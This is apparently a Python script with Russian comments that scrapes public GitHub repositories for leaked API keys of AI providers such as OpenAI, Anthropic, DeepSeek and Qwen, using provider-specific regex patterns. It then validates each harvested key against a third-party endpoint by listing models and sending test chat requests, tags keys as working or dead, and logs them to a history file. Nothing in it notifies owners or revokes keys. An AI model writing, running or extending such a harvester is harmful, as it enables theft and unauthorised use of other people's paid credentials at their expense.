"""
github_key_parser.py
Парсер ключей из публичных репозиториев GitHub.
Поддерживает: OpenAI, Anthropic, DeepSeek, Moonshot/Kimi, Qwen, MiniMax,
Zhipu/GLM, HuggingFace, Cohere, а также контекстный поиск.
"""

import os
import re
import json
import time
from datetime import datetime, timezone

import requests

# ─── конфиг ────────────────────────────────────────────────────────────────

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "")
if not GITHUB_TOKEN:
    raise SystemExit(
        "[!] нужен GITHUB_TOKEN.\n"
        "    создай: https://github.com/settings/tokens (без scopes)"
    )

HEADERS_GH = {
    "Authorization": f"Bearer {GITHUB_TOKEN}",
    "Accept": "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
}

HISTORY_FILE = "scan_history.json"

# Эндпоинт по умолчанию. Меняй под свой провайдер.
DEFAULT_ENDPOINT = "https://chat.kxsb.org/api/v1"
DEFAULT_MODEL = "azure-5k/deepseek-v4.1-flash"

# ─── паттерны ключей ───────────────────────────────────────────────────────

KEY_PATTERNS = [
    # OpenAI modern
    {"provider": "openai-proj",    "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "openai-svcacct", "regex": re.compile(r"\bsk-svcacct-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "openai-admin",   "regex": re.compile(r"\bsk-admin-[A-Za-z0-9_-]{20,}\b")},
    # Anthropic
    {"provider": "anthropic",      "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
    # Moonshot / Kimi
    {"provider": "kimi-code",      "regex": re.compile(r"\bsk-kimi-[A-Za-z0-9_-]{20,}\b")},
    # MiniMax token plan
    {"provider": "minimax-cp",     "regex": re.compile(r"\bsk-cp-[A-Za-z0-9_-]{20,}\b")},
    # Qwen / DashScope
    {"provider": "qwen-sp",        "regex": re.compile(r"\bsk-sp-[A-Za-z0-9_-]{20,}\b")},
    {"provider": "qwen-ws",        "regex": re.compile(r"\bsk-ws-[A-Za-z0-9_-]{20,}\b")},
    # DeepSeek: sk- + 32 hex
    {"provider": "deepseek",       "regex": re.compile(r"\bsk-[a-f0-9]{32}\b")},
    # Zhipu / GLM: id.secret
    {"provider": "zhipu-glm",      "regex": re.compile(r"\b[a-f0-9]{32}\.[A-Za-z0-9]{16}\b")},
    # HuggingFace
    {"provider": "huggingface",    "regex": re.compile(r"\bhf_[A-Za-z]{34}\b")},
    # Cohere
    {"provider": "cohere",         "regex": re.compile(r"\bco-[A-Za-z0-9_-]{20,}\b")},
    # fallback: любой sk- (строгая проверка: мин. 32 символа, есть цифры, заглавные и строчные)
    {"provider": "generic-sk",     "regex": re.compile(r"\bsk-(?=[A-Za-z0-9_-]*\d)(?=[A-Za-z0-9_-]*[A-Z])(?=[A-Za-z0-9_-]*[a-z])[A-Za-z0-9_-]{32,}\b")},
]


def identify_key(token: str):
    for pattern in KEY_PATTERNS:
        if pattern["regex"].fullmatch(token):
            return {"provider": pattern["provider"], "key": token}
    return None


def extract_keys_from_text(text: str):
    seen = set()
    results = []
    for pattern in KEY_PATTERNS:
        for match in pattern["regex"].finditer(text):
            token = match.group(0)
            if token in seen:
                continue
            identified = identify_key(token)
            if identified:
                seen.add(token)
                results.append(identified)
    return results


# ─── GitHub Code Search ────────────────────────────────────────────────────

def search_github_code(query: str, per_page: int = 30, max_pages: int = 3):
    results = []
    page = 1
    while page <= max_pages:
        url = "https://api.github.com/search/code"
        params = {"q": query, "per_page": per_page, "page": page}
        try:
            resp = requests.get(url, headers=HEADERS_GH, params=params, timeout=30)
        except requests.RequestException as e:
            print(f"[!] ошибка сети: {e}")
            break

        if resp.status_code == 403:
            retry_after = int(resp.headers.get("Retry-After", 60))
            print(f"[~] rate limit, жду {retry_after}s")
            time.sleep(retry_after)
            continue
        if resp.status_code == 422:
            print("[!] GitHub отверг запрос")
            break
        resp.raise_for_status()

        data = resp.json()
        items = data.get("items", [])
        if not items:
            break

        for item in items:
            results.append({
                "repo": item["repository"]["full_name"],
                "path": item["path"],
                "html_url": item["html_url"],
            })

        if len(items) < per_page:
            break
        page += 1
        time.sleep(1.5)

    return results


def fetch_file(repo: str, path: str) -> str:
    url = f"https://api.github.com/repos/{repo}/contents/{path}"
    headers = {**HEADERS_GH, "Accept": "application/vnd.github.raw+json"}
    try:
        resp = requests.get(url, headers=headers, timeout=30)
    except requests.RequestException:
        return ""
    return resp.text if resp.status_code == 200 else ""


# ─── сбор ключей ───────────────────────────────────────────────────────────

def collect_keys(query: str, max_files: int = 50):
    print(f"[*] ищу: {query}")
    hits = search_github_code(query, max_pages=3)

    all_keys = {}
    for i, hit in enumerate(hits[:max_files], 1):
        print(f"  [{i}/{min(len(hits), max_files)}] {hit['repo']}/{hit['path']}")
        text = fetch_file(hit["repo"], hit["path"])
        for item in extract_keys_from_text(text):
            key = item["key"]
            if key not in all_keys:
                all_keys[key] = {
                    "provider": item["provider"],
                    "repo": hit["repo"],
                    "path": hit["path"],
                    "html_url": hit["html_url"],
                }
        time.sleep(0.8)

    print(f"[+] найдено уникальных ключей: {len(all_keys)}")
    return all_keys


def collect_keys_with_context(provider_marker: str, max_files: int = 50):
    print(f"[*] контекстный поиск по маркеру: {provider_marker}")
    query = f"sk- {provider_marker}"
    hits = search_github_code(query, max_pages=5)

    all_keys = {}
    for i, hit in enumerate(hits[:max_files], 1):
        print(f"  [{i}/{min(len(hits), max_files)}] {hit['repo']}/{hit['path']}")
        text = fetch_file(hit["repo"], hit["path"])
        if provider_marker.lower() not in text.lower():
            continue
        for item in extract_keys_from_text(text):
            key = item["key"]
            if key not in all_keys:
                all_keys[key] = {
                    "provider": f"custom-{provider_marker}",
                    "repo": hit["repo"],
                    "path": hit["path"],
                    "html_url": hit["html_url"],
                }
        time.sleep(0.8)

    print(f"[+] найдено с маркером '{provider_marker}': {len(all_keys)}")
    return all_keys


# ─── проверка ключа ────────────────────────────────────────────────────────

def check_key(api_key: str, base_url: str = DEFAULT_ENDPOINT):
    url = f"{base_url.rstrip('/')}/models"
    headers = {"Authorization": f"Bearer {api_key}"}
    start = time.perf_counter()
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        latency = round(time.perf_counter() - start, 2)
    except requests.RequestException as e:
        return {"ok": False, "status_code": None, "latency": None, "error": str(e)}

    ok = resp.status_code == 200
    models = []
    if ok:
        try:
            models = [m.get("id", "") for m in resp.json().get("data", [])]
        except Exception:
            pass
    return {
        "ok": ok,
        "status_code": resp.status_code,
        "latency": latency,
        "body_snippet": resp.text[:300].replace("\n", " ").strip(),
        "models": models,
    }


def probe_all_models(api_key: str, base_url: str, models: list[str], max_probes: int = 7):
    """Перебирает до 7 моделей и собирает статусы."""
    url = f"{base_url.rstrip('/')}/chat/completions"
    headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
    
    results = []
    for model in models[:max_probes]:
        payload = {"model": model, "messages": [{"role": "user", "content": "ping"}], "max_tokens": 5}
        start = time.perf_counter()
        resp = None
        try:
            resp = requests.post(url, headers=headers, json=payload, timeout=15)
            latency = round(time.perf_counter() - start, 2)
            ok = resp.status_code == 200
            msg = resp.text[:80].replace("\n", " ").strip() if not ok else "OK"
        except Exception as e:
            ok, latency, msg = False, "?", str(e)
            
        results.append({
            "model": model, 
            "ok": ok, 
            "status": getattr(resp, 'status_code', 'ERR'), 
            "latency": latency, 
            "msg": msg
        })
        time.sleep(0.5)
        
    return results


# ─── форматирование ────────────────────────────────────────────────────────

def format_report(endpoint, key, provider, check_result, probe_results, catalog):
    lines = []
    lines.append("⚡️ Фаст-скан")
    lines.append(f"🌐 Endpoint: {endpoint}")
    lines.append(f"🔑 {key}")
    lines.append(f"🏷 Провайдер: {provider}")
    lines.append("")

    working_probes = [p for p in probe_results if p["ok"]]
    if working_probes:
        lines.append("🏆 ✅ working")
        lines.append(f"💬 {working_probes[0]['model']}: OK ({working_probes[0]['latency']}s)")
    else:
        lines.append("🏆 ❌ dead (все пробы отклонены)")
    lines.append("")

    lines.append(f"🧪 Пробы · {len(probe_results)}:")
    for p in probe_results:
        if p["ok"]:
            lines.append(f"{p['model']} → {p['status']} ✅ {p['latency']}s «PONG-OK»")
        else:
            icon = "❓" if p["status"] == 403 else "❌"
            err_msg = f" · 💬 {p['msg']}" if len(p['msg']) > 3 else ""
            lines.append(f"{p['model']} → {p['status']} {icon} {p['latency']}s{err_msg}")
    lines.append("")

    if catalog:
        lines.append(f"📚 Каталог · {len(catalog)}:")
        for m in catalog[:10]:
            lines.append(m)
        if len(catalog) > 10:
            lines.append(f"… и ещё {len(catalog) - 10} — фулскан покажет все")
    
    lines.append("")
    lines.append("💾 Записано в историю")
    return "\n".join(lines)


# ─── история ───────────────────────────────────────────────────────────────

def append_history(entry: dict):
    history = []
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r", encoding="utf-8") as f:
                history = json.load(f)
        except Exception:
            history = []
    entry["timestamp"] = datetime.now(timezone.utc).isoformat()
    history.append(entry)
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        json.dump(history, f, ensure_ascii=False, indent=2)
